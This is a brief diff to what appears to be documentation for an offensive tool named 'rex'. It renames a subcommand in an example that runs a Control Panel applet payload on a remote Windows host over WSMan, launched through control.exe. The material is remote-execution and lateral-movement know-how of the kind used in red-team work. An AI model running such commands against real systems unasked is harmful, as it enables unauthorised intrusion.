@@ -27,7 +27,7 @@ applets require. Confirm the undecorated `CPlApplet` export and match the module
 architecture to the selected `control.exe`.
 
 ```text
-rex WSManExec --target 10.0.0.15 --payload-type cpl \
+rex wsman-exec --target 10.0.0.15 --payload-type cpl \
   --remote-path C:\ProgramData\module.cpl --launcher control.exe
 ```
 
